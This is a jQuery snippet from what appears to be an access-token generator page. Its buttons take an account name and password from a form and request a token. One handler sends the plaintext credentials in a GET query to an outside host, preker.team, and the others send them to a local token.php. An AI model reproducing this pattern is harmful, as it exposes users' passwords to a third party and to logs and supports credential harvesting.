
  $("#server").click(function(){
  $("#server").button('loading');
    access_token.value=". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .";
    var tk = document.getElementById("tk").value;
    var mk = document.getElementById("mk").value;
    var url = "https://preker.team/assets/token.php";
    $.get(url, {
      u: tk,
      p: mk
    }).done(function(e) {
          $("#server").button('reset');
          if(e.session_key){
            access_token.value=e.access_token;
          }else{
            access_token.value=e.error_msg;
          }
    }).error(function() {
        $("#server").button('reset');
        access_token.value='Server Aplikasi Gagal';
    });
  }).error(err => {
    $("#server").button('reset');
  });
//});
  $("#android").click(function(){
  $("#android").button('loading');
    access_token.value=". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .";
    var tk = document.getElementById("tk").value;
    var mk = document.getElementById("mk").value;
    var url = "token.php";
    $.get(url, {
      u: tk,
      p: mk,
      a: 'android'
    }).done(function(e) {
          $("#android").button('reset');
          if(e.session_key){
            access_token.value=e.access_token;
          }else{
            access_token.value=e.error_msg;
          }
    }).error(function() {
        $("#android").button('reset');
        access_token.value='Server Aplikasi Gagal';
    });
  }).error(err => {
    $("#android").button('reset');
  });

    $("#ios").click(function(){
    $("#ios").button('loading');
      access_token.value=". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .";
      var tk = document.getElementById("tk").value;
      var mk = document.getElementById("mk").value;
      var url = "token.php";
      $.get(url, {
        u: tk,
        p: mk,
        a: 'ios'
      }).done(function(e) {
            $("#ios").button('reset');
            if(e.session_key){
              access_token.value=e.access_token;
            }else{
              access_token.value=e.error_msg;
            }
      }).error(function() {
          $("#ios").button('reset');
          access_token.value='Server Aplikasi Gagal';
      });
    }).error(err => {
      $("#ios").button('reset');
    });
